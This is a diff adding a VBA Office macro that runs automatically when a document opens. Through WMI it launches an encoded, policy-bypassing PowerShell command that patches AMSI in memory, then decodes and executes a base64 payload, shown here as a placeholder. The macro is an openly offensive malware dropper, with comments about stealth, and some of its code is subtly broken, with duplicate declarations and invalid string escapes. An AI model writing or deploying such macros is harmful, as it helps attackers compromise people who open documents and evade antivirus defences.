@@ -1,0 +1,67 @@
+Sub MyMacro()
+    Dim psCommand As String
+    Dim wmi As Object
+    Dim pid As Long
+
+    ' PS AMSI bypass script encoded as a single line command
+    ' Use a base64-encoded payload for better stealth
+    Dim amsiBypassScript As String
+amsiBypassScript = "$funcAddr = [IntPtr]::Zero;" & _
+    "$funcAddr = (Add-Type -MemberDefinition @'" & vbCrLf & _
+    "    [DllImport(\"kernel32.dll\")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);" & vbCrLf & _
+    "    [DllImport(\"kernel32.dll\")] public static extern IntPtr GetModuleHandle(string lpModuleName);" & vbCrLf & _
+    "'@ -Name 'Win32' -Namespace 'Win32' -PassThru)::GetProcAddress((Add-Type -Name 'Win32' -Namespace 'Win32' -MemberDefinition @'" & vbCrLf & _
+    "    [DllImport(\"kernel32.dll\")] public static extern IntPtr GetModuleHandle(string lpModuleName);" & vbCrLf & _
+    "'@ -PassThru)::GetModuleHandle('amsi.dll'), 'AmsiOpenSession');" & _
+    "$oldProtectionBuffer = 0;" & _
+    "$vp = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Add-Type -MemberDefinition @'" & vbCrLf & _
+    "    [DllImport(\"kernel32.dll\")] public static extern bool VirtualProtect(IntPtr lpAddress, UInt32 dwSize, UInt32 flNewProtect, out UInt32 lpflOldProtect);" & vbCrLf & _
+    "'@ -Name 'Kernel32' -Namespace 'Kernel32' -PassThru)::VirtualProtect, (New-Object System.Func[System.IntPtr, UInt32, UInt32, System.UInt32 ByRef, bool]));" & _
+    "$vp.Invoke($funcAddr, 3, 0x40, [ref]$oldProtectionBuffer);" & _
+    "Write-Output 'AMSI bypass applied';" & vbCrLf & _
+    "function Decode-Base64([string]$b64string) {" & vbCrLf & _
+    "    $bytes = [Convert]::FromBase64String($b64string)" & vbCrLf & _
+    "    return [System.Text.Encoding]::Unicode.GetString($bytes)" & vbCrLf & _
+    "}" & vbCrLf & _
+    "$encodedPayload = '<BASE64_PAYLOAD_HERE>';" & vbCrLf & _
+    "$decodedPayload = Decode-Base64 $encodedPayload;" & vbCrLf & _
+    "Invoke-Expression $decodedPayload;"
+
+    ' Convert to bytes and encode to Base64 for -EncodedCommand
+    Dim bytes() As Byte
+    bytes = StrConv(amsiBypassScript, vbFromUnicode)
+    Dim base64Script As String
+    base64Script = EncodeBase64(bytes)
+
+    ' Build PS command line (command to be executed)
+    Dim psCommand As String
+    psCommand = "powershell.exe -nop -exec bypass -EncodedCommand " & base64Script
+
+    ' Launch PowerShell process via WMI
+    Dim wmi As Object
+    Dim pid As Long
+    Set wmi = GetObject("winmgmts:")
+    wmi.Get("Win32_Process").Create psCommand, Null, Null, pid
+End Sub
+
+' Base64 encoding function for VBA
+Function EncodeBase64(bytes() As Byte) As String
+    Dim xmlObj As Object
+    Set xmlObj = CreateObject("MSXML2.DOMDocument.6.0")
+    Dim elem As Object
+    Set elem = xmlObj.createElement("b64")
+    elem.DataType = "bin.base64"
+    elem.nodeTypedValue = bytes
+    EncodeBase64 = elem.Text
+    ' Remove any line breaks from the encoded string
+    EncodeBase64 = Replace(EncodeBase64, vbCrLf, "")
+End Function
+
+Sub Document_Open()
+    MyMacro
+End Sub
+
+Sub AutoOpen()
+    MyMacro
+End Sub
+
